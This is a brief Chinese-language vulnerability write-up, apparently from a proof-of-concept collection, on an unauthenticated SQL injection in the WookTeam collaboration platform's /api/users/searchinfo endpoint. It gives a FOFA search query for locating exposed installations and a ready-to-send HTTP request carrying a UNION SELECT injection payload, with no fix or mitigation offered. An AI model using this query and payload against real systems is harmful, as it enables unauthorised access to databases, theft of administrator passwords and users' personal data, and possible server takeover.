## WookTeam轻量级的团队在线协作系统存在SQL注入漏洞

## 一、漏洞简介
wookteam项目基于PHP语言开发，项目搭建需要PHP相关环境，涉及中间件技术以及Nginx和MySQL。该项目很容易在Docker环境中部署。下载源码后，使用./cmdinstall命令一键构建项目。Wookteam是一个支持在线协作管理和沟通的开源平台。它提供在线流程图、思维导图构建以及项目管理的可视化展示和分析，让项目团队成员直观地看到项目的进展情况和相关问题。WookTeam /api/users/searchinfo接口存在SQL注入漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

## fofa
```
title="Wookteam"
```

## POC
```
GET /api/users/searchinfo?where[username]=1%27%29+UNION+ALL+SELECT+NULL%2CCONCAT%280x7e%2Cversion%28%29%2C0x7e%29%2CNULL%2CNULL%2CNULL%23 HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: keep-alive
```
